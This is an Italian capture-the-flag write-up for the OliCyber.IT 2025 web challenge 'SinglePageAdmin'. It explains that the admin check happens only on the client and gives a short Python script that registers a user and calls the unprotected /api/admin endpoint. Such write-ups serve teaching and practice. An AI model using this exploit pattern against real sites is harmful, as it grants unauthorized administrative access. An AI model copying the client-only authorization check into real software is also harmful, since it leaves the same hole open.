# OliCyber.IT 2025 - Competizione nazionale

## [web] SinglePageAdmin (90 solves)

È così che si fanno le Single Page Applications?

[https://single-page-admin.challs.olicyber.it](https://single-page-admin.challs.olicyber.it)

Author: Lorenzo Leonardini <@pianka>

## Panoramica

Il sito si presenta come una pagina molto semplice di login. Quando creiamo un utente o facciamo login, la pagina ri-renderizza per mostrare un messaggio di benvenuto.

## Soluzione

Se osserviamo il codice lato client, vediamo che se il server risponde con `is_admin: 1`, viene visualizzata anche una pagina di amministrazione. La pagina admin contiene un grande pulsante blu che invia una richiesta al server per ottenere la flag.

Anche se il client controlla se l’utente è admin per mostrare la pagina, il server non effettua alcun controllo quando gestisce la richiesta.

## Exploit

Possiamo semplicemente creare un utente e fare una richiesta all'endpoint dell'admin:

```py
import requests
import os

URL = os.environ.get("URL", "https://localhost:3000")
if URL.endswith("/"):
    URL = URL[:-1]

res = requests.post(f'{URL}/api/register', json={
    'username': os.urandom(16).hex()
})

res = requests.post(f'{URL}/api/admin', headers={
    'Authorization': f'Bearer {res.json()["token"]}'
})
print(res.json()['message'])
```
